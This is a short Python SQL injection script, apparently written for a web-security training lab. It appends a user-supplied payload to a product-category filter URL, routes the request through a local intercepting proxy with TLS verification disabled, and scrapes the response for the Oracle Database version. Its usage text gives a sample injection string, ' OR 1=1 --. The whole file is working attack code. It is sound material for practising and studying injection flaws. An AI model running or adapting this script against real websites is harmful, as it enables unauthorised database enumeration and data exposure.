import requests
import urllib3
import sys
from bs4 import BeautifulSoup
import re


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # Disable SSL verification warning
proxies = { 'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080' }

def exploitSqli(url, payload):
  uri = "/filter?category=Gifts"
  labResponse = requests.get(url + uri + payload, proxies=proxies, verify=False)

  if "Oracle Database" in labResponse.text:
    version = BeautifulSoup(labResponse.text, "html.parser").find(text=re.compile(".*Oracle\sDatabase.*"))
    print("[+] Database version: %s" % version)
    return True
  return False

if __name__ == "__main__":
  try:
    url = sys.argv[1].strip()
    payload = sys.argv[2].strip()
  except IndexError:
    print("[+] Usage: %s <url> <payload>" % sys.argv[0])
    print("[+] Example: %s www.example.com \"' OR 1=1 --\"" % sys.argv[0])
    sys.exit(-1)

  print("[+] Retrieving database version...")
  if not exploitSqli(url, payload):
    print("[+] SQL Injection unsuccessful!")
